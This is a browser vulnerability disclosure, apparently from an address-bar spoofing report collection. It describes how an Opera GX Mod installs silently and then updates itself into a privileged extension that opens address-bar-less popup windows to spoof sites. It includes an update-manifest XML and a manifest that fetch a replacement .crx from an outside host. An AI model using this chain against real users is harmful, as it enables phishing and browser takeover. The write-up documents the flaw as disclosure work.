# Title: Full Address Bar Spoof and Browser Takeover Inside Opera GX

## Description: 
In Opera GX there isn't any check for installing Mods and we can abuse this to update the Mod to an Extension and have higher privileges.

Opera GX Mods
Lately I was in a group chat were they talked about the new OperaGX feature Mods, I was curious and wanted to search about it I found the news article https://blogs.opera.com/news/2023/02/opera-gx-opera-gf-valentines-day-mod/

Opened my GX and looked how it worked luckily everything was documented https://github.com/opera-gaming/gxmods , By looking at example mods I noticed these mods are basically extensions but without any permissions.

Downloaded an example and played with it I found out if the manifest had the mod attribute then it will be treated differently as an extension, It can't have any content_script or permissions.

Mods Installation
From the documentation it says you can install a mod by going to extensions and choosing load unpacked then your folder or by dropping the packed .crx file into the browser.

I know that if you download a packed extension .crx inside the browser it will prompt a message saying:

image-2023-02-27T10:27:09.910Z.png

But what if we download a .crx mod

image-2023-02-27T10:28:40.291Z.png

As you can see our Mod was added to the browser without any prompt message or permission, but Mods can't do that much like I said before the most thing I thought of was CSS injection on any website, how we can abuse this mod to do malicious actions?

Mod update
One of manifest V3 features is you can have update an extension outside the store and host it on your server, update_url by entering our host inside this attribute the browser will send a request to it and update our extension to the newest version.

I created a Mod and pointed update_url to this XML document:

<?xml version='1.0' encoding='UTF-8'?>
<gupdate xmlns='http://www.google.com/update2/response' protocol='2.0'>
  <app appid='ognjhldibihbecibchfedidcmgpcenjj'>
    <updatecheck codebase='https://pwr.wtf/asdfgh/video.crx' version='1.23' />
  </app>
</gupdate>
This will update the mod to the newer version 1.23 and contents of our new version is:

{"update_url": "https://pwr.wtf/asdfgh/pp.txt",
    "manifest_version": 3,
    "name": "Video Player",
    "description": "Best Video Player",
    "version": "1.23",
    "icons":
    {
        "512": "icon_512.png"
    },
    "developer":
    {
        "name": "Opera Softwarea"
    },

   "background": {
    "service_worker": "x.js"
  }
}
As you can see now we don't have the mod attribute which will change our mod to extension, and also we have a background script x.js which will run in context of extension.

Now let's try our attack

User visits our page, the mod will be installed automatically:

image-2023-02-27T10:38:04.444Z.png

User closes his browser and opens it again

image-2023-02-27T10:38:48.450Z.png

The Mod changes to Extension and our background script will be executed.

Background script
Even after updating the extension still doesn't have any permissions, tried everything from manifest but it didn't work, looked at the background script and it had these permissions enabled by default:

image-2023-02-27T10:42:03.294Z.png

Tried all of them and they didn't have much permissions but one interesting function caught my eye didn't saw it before, chrome.windows
It has access to all opened windows which we can remove them and create new ones, looking at documentation chrome.windows.create there is this interesting value called type lets see examples, now we can use normal and popup let's try popup:

image-2023-02-27T10:46:11.336Z.png

Notices anything weird? there isn't any address bar and this allow us to create our own URL bar and trick anyone they are on a legit origin.

Exploitation
image-2023-02-27T10:50:25.268Z.png

Hopefully the diagram is clear, we also have access to chrome.windows.remove which enable us to remove the main window and only open the spoofed window we control, this will make the browser only open our window and the main window can't be accessed.

I'm not sure about how Opera checks for updates regularly but after every restart it checks for it, I think after some hours it will also check for updates no need for browser restart this will make the attack more effective.

## Author: Renwa

## Affected Browser(s): Opera GX

## Severity: Low

## Spoof Type: Window-Without-Address-Bar

## References: https://medium.com/@renwa/you-are-not-where-you-think-you-are-opera-browsers-address-bar-spoofing-vulnerabilities-aa36ad8321d8

## POC Photo/Video: bug-009.mp4

## Discovery Date: 2023-02-27

